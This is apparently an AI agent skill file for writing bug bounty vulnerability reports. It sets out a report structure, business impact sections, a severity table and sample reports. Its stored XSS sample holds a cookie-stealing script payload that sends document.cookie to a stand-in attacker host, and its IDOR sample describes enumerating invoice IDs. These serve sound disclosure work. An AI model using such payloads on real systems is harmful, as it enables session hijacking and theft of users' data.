---
name: bug-bounty-report
description: >
  Professional vulnerability report writing skill. Structures findings per program
  guidelines, business impact analysis, and triage-friendly formatting following HackerOne/OffensiveBlog standards.
  Trigger: When user says "report", "writeup", "write finding", "create report", or completes a vulnerability investigation.
license: Apache-2.0
metadata:
  author: gentleman-programming
  version: "1.0"
---

## When to Use

- Writing a vulnerability report for a bug bounty program
- Documenting a security finding with business impact analysis
- Formatting a finding to be triage-friendly for security teams
- User says "report", "writeup", "document finding", "create report", "redactar"
- After a vulnerability is validated and ready to be reported

## Critical Patterns

### Report Structure (HackerOne Standard)

```markdown
## Title
[Severity] Vulnerability Title

## Summary
One paragraph: what you found, how you found it, and the impact.

## Step-by-step Reproduction
1. Description of step
2. What to do
3. Expected vs actual result

## Impact
What an attacker could do with this vulnerability. Connect to business damage.

## Mitigation
How to fix it. Be specific — code level when possible.

## References
- CVE-XXXX-XXXXX
- CWE-XXX
- https://example.com/advisory

## Supporting Evidence
- Screenshots
- Payloads used
- HTTP requests/responses
- POC code
```

### Business Impact Sections (Mandatory for High Severity)

```markdown
## Business Impact Analysis

### Financial Impact
Could this enable direct revenue theft, billing manipulation, or free access?
Rate: small (<$10K), medium ($10K-$1M), large ($1M+), catastrophic

### Data Breach Risk
What data categories? How many records? GDPR notification obligations?

### Reputational Impact
Would this be newsworthy? Enterprise customer churn risk?

### Compliance Exposure
GDPR, HIPAA, PCI-DSS violations? Regulatory fine exposure?
```

### Severity Classification (CVSS v3.1 Aligned)

| Rating | Criteria |
|--------|----------|
| Critical | RCE, SQLi with data extraction, Auth bypass on admin endpoints |
| High | IDOR with PII access, SSRF to cloud metadata, Stored XSS with account takeover |
| Medium | Reflected XSS without account impact, CSRF on non-sensitive action |
| Low | Informational, best practice violations, self-DoS |

## Code Examples

### XSS Finding Report
```markdown
## Title
[High] Stored XSS in User Profile Bio Allows Account Takeover

## Summary
The user profile bio field at `/settings/profile` does not sanitize HTML
before rendering. An attacker can craft a payload that executes arbitrary
JavaScript in the context of any user viewing the profile.

## Steps to Reproduce
1. Navigate to `/settings/profile`
2. Enter payload `<script>fetch('https://attacker.com?c='+document.cookie)</script>` in bio field
3. Save profile
4. Any user viewing your profile triggers the payload

## Impact
- Session hijacking via cookie theft
- Account takeover of any user viewing the profile
- Defacement of profile page
```

### IDOR Finding Report
```markdown
## Title
[High] IDOR in Invoice Download Allows Access to All User Invoices

## Summary
The invoice download endpoint `/api/invoices/{id}/download` does not verify
that the invoice belongs to the authenticated user. By manipulating the
invoice ID, an attacker can access any user's invoices.

## Steps to Reproduce
1. Authenticate as user@example.com
2. Navigate to your invoice at `/api/invoices/12345/download`
3. Change `12345` to `12346`
4. Download returns another user's invoice

## Impact
- Unauthorized access to all users' invoice data
- PII exposure (names, addresses, payment amounts)
- GDPR violation (unauthorized data access)
```

## Triage-Friendly Checklist

- [ ] Title clearly states severity + vulnerability type
- [ ] Summary is 1-2 sentences, no jargon
- [ ] Reproduction steps are clear enough for a non-expert
- [ ] Impact connects technical finding to business damage
- [ ] CVSS vector calculated (for high/critical)
- [ ] CWE correctly identified
- [ ] All evidence attached (screenshots, PoC, HTTP logs)
- [ ] Mitigation is implementable, not just "sanitize input"
- [ ] References cited (CVE, CWE, similar reports)

## Common Mistakes to Avoid

- **Don't** say "I found XSS" — say "Stored XSS in comments allows session hijacking"
- **Don't** write "Impact: XSS" — write "Account takeover via session hijacking"
- **Don't** skip business impact — even low severity needs it
- **Don't** use "might", "could be", "maybe" — be definitive with evidence
- **Don't** submit without duplication check — search CVE, HackerOne, similar programs

## Resources

- **Templates**: See [assets/](assets/) for report templates by severity
- **CWE Database**: https://cwe.mitre.org/
- **CVSS Calculator**: https://www.first.org/cvss/calculator
- **HackerOne Reporting Guidelines**: Program-specific rules always win